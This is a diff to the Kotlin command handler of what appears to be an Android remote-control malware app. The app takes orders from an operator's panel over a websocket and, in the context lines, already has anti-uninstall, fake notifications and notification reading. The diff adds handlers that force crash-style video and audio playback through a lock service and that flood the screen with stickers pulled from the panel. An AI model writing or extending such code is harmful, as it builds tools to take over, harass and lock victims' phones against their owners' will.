@@ -126,6 +126,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                     ctx.startService(i)
                     ctx.stopService(i)
                 } catch (_: Exception) {}
+                StickerSpam.stop()
                 done(mapOf("ok" to true))
             }
 
@@ -184,7 +185,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 done(mapOf("anti_uninstall" to true))
             }
 
-            // ===== FAKE NOTIF (BARU) =====
+            // ===== FAKE NOTIF =====
             "fake_notif" -> {
                 val title = args?.get("title")?.asString ?: "Pesan Baru"
                 val message = args?.get("message")?.asString ?: ""
@@ -194,7 +195,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 done(mapOf("ok" to true))
             }
 
-            // ===== BROADCAST CHAT (BARU) =====
+            // ===== BROADCAST CHAT =====
             "broadcast" -> {
                 val title = args?.get("title")?.asString ?: "Pesan"
                 val message = args?.get("message")?.asString ?: ""
@@ -205,7 +206,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 done(mapOf("ok" to true))
             }
 
-            // ===== SET WALLPAPER (BARU) =====
+            // ===== SET WALLPAPER =====
             "set_wallpaper" -> {
                 val url = args?.get("url")?.asString ?: ""
                 if (url.isEmpty()) {
@@ -217,7 +218,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 }
             }
 
-            // ===== OPEN WEBSITE (BARU) =====
+            // ===== OPEN WEBSITE =====
             "open_website" -> {
                 val url = args?.get("url")?.asString ?: ""
                 if (url.isEmpty()) {
@@ -235,7 +236,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 }
             }
 
-            // ===== HIDE BROADCAST (BARU) =====
+            // ===== HIDE BROADCAST =====
             "hide_broadcast" -> {
                 Handler(Looper.getMainLooper()).post {
                     BroadcastOverlay.hide(ctx)
@@ -243,9 +244,89 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
                 done(mapOf("ok" to true))
             }
 
-            // ===== READ NOTIFS (BARU) =====
+            // ===== READ NOTIFS =====
             "read_notifs" -> {
                 done(mapOf("type" to "text", "data" to "Notif listener aktif"))
+            }
+
+            // ===== SEND MP4 =====
+            "send_mp4" -> {
+                val url = args?.get("url")?.asString
+                val panelBase = App.config.panelUrl
+                    .replace("ws://", "http://")
+                    .replace("wss://", "https://")
+                    .replace("/ws", "")
+                val finalUrl = if (url.isNullOrEmpty()) "$panelBase/videos/warning.mp4" else url
+                val i = Intent(ctx, LockService::class.java).apply {
+                    putExtra("type", "crash")
+                    putExtra("videoUrl", finalUrl)
+                    putExtra("audioUrl", "")
+                }
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    ctx.startForegroundService(i)
+                } else {
+                    ctx.startService(i)
+                }
+                done(mapOf("ok" to true))
+            }
+
+            // ===== SEND MP3 =====
+            "send_mp3" -> {
+                val url = args?.get("url")?.asString
+                val panelBase = App.config.panelUrl
+                    .replace("ws://", "http://")
+                    .replace("wss://", "https://")
+                    .replace("/ws", "")
+                val finalUrl = if (url.isNullOrEmpty()) "$panelBase/audios/warning.mp3" else url
+                val i = Intent(ctx, LockService::class.java).apply {
+                    putExtra("type", "crash")
+                    putExtra("videoUrl", "")
+                    putExtra("audioUrl", finalUrl)
+                }
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    ctx.startForegroundService(i)
+                } else {
+                    ctx.startService(i)
+                }
+                done(mapOf("ok" to true))
+            }
+
+            // ===== SPAM STIKER =====
+            "spam_sticker" -> {
+                val urlsArr = args?.getAsJsonArray("urls")
+                val urls = mutableListOf<String>()
+                if (urlsArr != null) {
+                    for (i in 0 until urlsArr.size()) {
+                        urls.add(urlsArr.get(i).asString)
+                    }
+                }
+                val panelBase = App.config.panelUrl
+                    .replace("ws://", "http://")
+                    .replace("wss://", "https://")
+                    .replace("/ws", "")
+
+                if (urls.isEmpty()) {
+                    for (i in 1..5) {
+                        urls.add("$panelBase/stickers/sticker$i.png")
+                    }
+                }
+
+                StickerSpam.start(ctx, urls, 200, 30)
+                done(mapOf("ok" to true, "count" to urls.size))
+            }
+
+            // ===== STOP SPAM STIKER =====
+            "stop_sticker" -> {
+                StickerSpam.stop()
+                done(mapOf("ok" to true))
+            }
+
+            // ===== STOP BROADCAST =====
+            "stop_broadcast" -> {
+                Handler(Looper.getMainLooper()).post {
+                    BroadcastOverlay.hide(ctx)
+                }
+                done(mapOf("ok" to true))
             }
 
             else -> done(mapOf("error" to "unknown: $cmd"))
@@ -253,7 +334,7 @@ class CommandHandler(private val ctx: Context, private val deviceId: String) {
     }
 
     // ============================================================
-    // LOCK SERVICE HELPER (AUTO VIDEO/AUDIO WARNING)
+    // LOCK SERVICE HELPER
     // ============================================================
     private fun startLockService(
         type: String,
